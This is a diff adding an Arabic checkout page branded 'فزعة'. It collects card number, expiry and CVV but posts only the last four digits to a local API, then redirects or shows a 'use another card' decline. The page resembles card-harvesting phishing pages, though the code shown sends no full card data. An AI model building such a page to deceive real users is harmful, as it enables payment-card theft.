@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الدفع - فزعة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: #f2f2f7;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .app {
+            width: 100%;
+            max-width: 500px;
+        }
+        .payment-shell {
+            background: #fff;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+        }
+        header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eee;
+            margin-bottom: 25px;
+        }
+        .logo { width: 80px; }
+        .decline-box {
+            display: none;
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: #fff;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .decline-box.show { display: block; }
+        .field { margin-bottom: 20px; }
+        .label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-family: inherit;
+            direction: ltr;
+            text-align: right;
+        }
+        input:focus { outline: none; border-color: #8B1538; }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #b18c33, #caa64e);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            font-family: inherit;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn:hover { transform: scale(1.02); }
+        .secure-notice {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px;
+            background: rgba(10, 132, 255, 0.1);
+            border-radius: 8px;
+            margin-top: 15px;
+            font-size: 0.85rem;
+            color: #1f4f8f;
+        }
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+        .loading-overlay.show { display: flex; }
+        .loading-card {
+            background: #fff;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #eee;
+            border-top-color: #8B1538;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .card-logos { display: flex; gap: 10px; margin-top: 10px; justify-content: flex-end; }
+        .card-logos i { font-size: 2rem; }
+        .card-logos .fa-cc-visa { color: #1434cb; }
+    </style>
+</head>
+<body>
+    <div class="app">
+        <div class="payment-shell">
+            <header>
+                <img src="/images/logo.png" class="logo" alt="فزعة">
+            </header>
+            
+            <div class="decline-box" id="declineBox">
+                <i class="fas fa-times-circle" style="font-size: 2rem; margin-bottom: 10px;"></i>
+                <h3>تم رفض البطاقة</h3>
+                <p>يرجى استخدام بطاقة أخرى</p>
+            </div>
+            
+            <form id="paymentForm">
+                <div class="field">
+                    <label class="label">اسم حامل البطاقة</label>
+                    <input type="text" id="cardHolder" placeholder="كما هو مدون على البطاقة">
+                </div>
+                <div class="field">
+                    <label class="label">رقم البطاقة</label>
+                    <input type="tel" id="cardNumber" placeholder="xxxx xxxx xxxx xxxx" maxlength="19">
+                    <div class="card-logos">
+                        <i class="fa-brands fa-cc-visa"></i>
+                        <img src="/images/Mastercard.svg" style="width: 40px;">
+                    </div>
+                </div>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                    <div class="field">
+                        <label class="label">تاريخ الانتهاء</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
+                    </div>
+                    <div class="field">
+                        <label class="label">CVV</label>
+                        <input type="tel" id="cvv" placeholder="***" maxlength="3">
+                    </div>
+                </div>
+                
+                <div class="secure-notice">
+                    <i class="fas fa-shield-halved"></i>
+                    <span>معلوماتك محمية ومشفرة</span>
+                </div>
+                
+                <button type="submit" class="btn">إتمام الدفع</button>
+            </form>
+        </div>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-card">
+            <div class="spinner"></div>
+            <p>جاري التحقق من البطاقة...</p>
+        </div>
+    </div>
+    
+    <script>
+        const API_BASE = '/api';
+        
+        // Format card number
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            for (let i = 0; i < value.length && i < 16; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+        });
+        
+        // Format expiry
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+        
+        // Submit payment
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            
+            if (cardNumber.length < 13) {
+                alert('يرجى إدخال رقم بطاقة صحيح');
+                return;
+            }
+            
+            document.getElementById('loadingOverlay').classList.add('show');
+            
+            try {
+                const response = await fetch(`${API_BASE}/submit-payment`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        cardLast4: cardNumber.slice(-4),
+                        cardType: cardNumber.startsWith('4') ? 'visa' : 'mastercard'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    window.location.href = data.redirect;
+                } else {
+                    document.getElementById('loadingOverlay').classList.remove('show');
+                    document.getElementById('declineBox').classList.add('show');
+                }
+            } catch (error) {
+                document.getElementById('loadingOverlay').classList.remove('show');
+                alert('حدث خطأ في الاتصال');
+            }
+        });
+    </script>
+</body>
+</html>
